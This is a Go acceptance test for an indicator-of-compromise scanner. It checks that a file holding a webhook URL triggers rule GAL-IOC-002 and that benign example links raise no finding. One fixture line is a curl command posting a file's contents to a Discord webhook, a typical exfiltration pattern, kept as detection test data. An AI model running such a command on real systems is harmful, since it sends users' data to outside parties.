package acceptance_test

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"testing"
)

// iocReport mirrors the IOC part of report.json.
type iocReport struct {
	IOCs []struct {
		Type  string `json:"type"`
		Value string `json:"value"`
		Path  string `json:"path"`
		Line  int    `json:"line"`
	} `json:"iocs"`
}

func TestAgentAnalyzeIOC(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		content string
		// expectations
		wantRule string   // rule that must be present at notes.txt:wantLine; empty means no findings at all
		wantLine int      // line of the finding
		wantIOCs []string // "type value line"
	}{
		{
			name:     "discord webhook on line 2",
			content:  "build notes\ncurl -d @msg https://discord.com/api/webhooks/123/token\n",
			wantRule: "GAL-IOC-002",
			wantLine: 2,
			wantIOCs: []string{"url https://discord.com/api/webhooks/123/token 2", "domain discord.com 2"},
		},
		{
			name:    "benign links are listed without findings",
			content: "Docs: https://docs.example.test/guide and https://github.example.test/org/repo.\nContact: dev@example.test\n",
			wantIOCs: []string{
				"url https://docs.example.test/guide 1", "domain docs.example.test 1",
				"url https://github.example.test/org/repo 1", "domain github.example.test 1",
				"email dev@example.test 2", "domain example.test 2",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given a text file built at test time
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, "notes.txt"), []byte(tt.content), 0o600); err != nil {
				t.Fatal(err)
			}
			out := filepath.Join(t.TempDir(), "out")
			// When the agent analyzes it
			stdout, stderr, code := runAgent(t, "analyze", "-o", out, filepath.Join(dir, "notes.txt"))
			if code != 0 {
				t.Fatalf("analyze exit = %d, want 0\nstdout: %s\nstderr: %s", code, stdout, stderr)
			}
			b, err := os.ReadFile(filepath.Join(out, "report.json"))
			if err != nil {
				t.Fatal(err)
			}
			var rep report
			var iocs iocReport
			if err := json.Unmarshal(b, &rep); err != nil {
				t.Fatal(err)
			}
			if err := json.Unmarshal(b, &iocs); err != nil {
				t.Fatal(err)
			}
			// Then the report has the expected finding (or none) and lists the IOCs with path:line
			if tt.wantRule == "" {
				if len(rep.Findings) != 0 {
					t.Errorf("findings = %+v, want none", rep.Findings)
				}
			} else if at := fmt.Sprintf("notes.txt:%d", tt.wantLine); !hasFinding(rep, tt.wantRule, at) {
				t.Errorf("no %s at %s in %+v", tt.wantRule, at, rep.Findings)
			}
			var got []string
			for _, i := range iocs.IOCs {
				if i.Path != "notes.txt" {
					t.Errorf("ioc path = %q, want notes.txt", i.Path)
				}
				got = append(got, fmt.Sprintf("%s %s %d", i.Type, i.Value, i.Line))
			}
			if fmt.Sprint(got) != fmt.Sprint(tt.wantIOCs) {
				t.Errorf("iocs = %q, want %q", got, tt.wantIOCs)
			}
		})
	}
}
